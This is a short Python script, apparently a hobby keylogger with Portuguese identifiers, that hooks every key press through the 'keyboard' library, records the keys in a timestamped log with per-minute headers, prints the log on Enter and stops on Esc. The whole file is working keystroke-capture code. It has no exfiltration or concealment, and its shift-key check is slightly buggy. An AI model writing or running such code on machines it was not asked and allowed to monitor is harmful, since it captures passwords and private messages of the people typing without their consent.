import keyboard
import time
import datetime

class Texto:
    def __init__(self) -> None:
        self.texto = ""
        self.initialTime = time.time()
        self.lastKey = ""
        self.sameKeyCounter = 1

        self.setHeader()
        return
    
    def setTexto(self, str):
        self.texto += str
        return
    
    def setHeader(self):
        datetimeNow = datetime.datetime.now()
        dataStr = str(datetimeNow.day) + "/" + str(datetimeNow.month) + "/" + str(datetimeNow.year)
        horaStr = str(datetimeNow.hour) +":"+str(datetimeNow.minute)
        header = "\n\n ---------[" + str(dataStr) + "|" + str(horaStr) + "] ---------\n"
        self.texto += header
    
    def onKeyPress(self, key):
        self.setTexto(self.treatChar(key.name))

        if(key.name == self.lastKey):
            self.sameKeyCounter += 1
        else:
            self.sameKeyCounter = 1
        
        if(time.time() - self.initialTime > 60):
            self.setHeader()
            self.initialTime = time.time()

        if(key.name == "enter"):
            print(self.texto)

        self.lastKey = key.name
        return
    
    def treatChar(self, char):
        if(len(char) == 1):
            return char
        else:
            treatedChar = ""
            

            if(char == "space"):
                treatedChar += " "
            elif(char == "esc"):
                treatedChar += "[esc]"
            # elif(char == "enter"):
            #     return "[enter]"
            elif(self.lastKey == "backspace" and char != "backspace"):
                treatedChar += "[<-" + str(self.sameKeyCounter) + "x]"
            elif(char == ("rshift" or "lshift" or "shift")):
                treatedChar += "[shift]"
            elif(char == ("enter")):
                treatedChar += "[enter]\n"
            return treatedChar
    
    def resetTimer(self):
        self.timer = 0
        return
    
        
            
    
texto = Texto()
keyboard.on_press(texto.onKeyPress)
keyboard.wait('esc')